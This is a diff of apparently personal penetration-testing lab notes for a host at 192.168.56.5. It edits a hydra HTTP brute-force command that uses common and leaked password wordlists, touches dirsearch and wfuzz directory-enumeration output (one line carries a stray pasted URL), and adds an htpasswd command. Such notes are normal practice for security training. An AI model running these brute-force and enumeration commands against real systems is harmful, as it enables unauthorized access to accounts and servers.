@@ -50,12 +50,15 @@ Keys : .htaccess <Limit></Limit>, php serialization, php destructor, exploiting 
 
 
 
+# Brute force
 
-hydra -L ~/OSCP/Tools/SecLists/Usernames/top-usernames-shortlist.txt  -P ~/OSCP/Tools/SecLists/Passwords/2020-200_most_used_passwords.txt -s 80 -f http://192.168.56.4/index.php http-get
+	$ hydra -l admin  -p darkweb2017-top100.txt  192.168.56.5 http-get
+
 
 # Scan web directory
 
 ## dirsearch
+
 	$ dirsearch -u http://192.168.56.5 -w directory-list-2.3-medium.txt
 
 	Target: http://192.168.56.5/
@@ -68,7 +71,7 @@ hydra -L ~/OSCP/Tools/SecLists/Usernames/top-usernames-shortlist.txt  -P ~/OSCP/
 
 	└─$ wfuzz  -c -z file,directory-list-2.3-medium.txt --sc 200 http://192.168.56.5/FUZZ/
 	Target: http://192.168.56.5/FUZZ/
-	Total requests: 220560
+	Total requests: 220560http://192.168.56.5
 
 	=====================================================================
 	ID           Response   Lines    Word       Chars       Payload                                                                                        
@@ -255,3 +258,7 @@ echo serialize($obj);
 	<Limit GET PUT HEAD OPTIONS DELETE>
 	require valid-user
 	</Limit>
+
+
+
+htpasswd /home/pwww/.htpasswd-users tom
